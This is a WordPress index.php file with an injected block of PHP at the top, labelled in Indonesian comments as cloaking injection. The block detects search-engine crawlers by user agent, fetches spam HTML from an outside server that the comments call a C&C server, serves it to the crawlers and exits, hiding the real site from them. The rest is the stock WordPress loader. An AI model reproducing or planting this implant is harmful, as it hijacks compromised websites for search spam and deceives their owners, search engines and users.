<?php
/* --- KODE INJEKSI CLOAKING MULAI --- */
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bot_list = array('Googlebot', 'Bingbot', 'Slurp'); // Target Bot

foreach($bot_list as $bot) {
    // Jika pengunjung adalah Googlebot
    if (stripos($user_agent, $bot) !== false) {
        // Ambil konten spam dari server luar (C&C Server)
        $spam_content = file_get_contents('https://theonlyd.xyz/santuariosantarita.html'); 
        
        // Tampilkan konten spam tersebut ke Googlebot
        echo $spam_content; 
        
        // Matikan proses agar Googlebot tidak melihat situs asli
        exit; 
    }
}
/* --- KODE INJEKSI CLOAKING SELESAI --- */

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
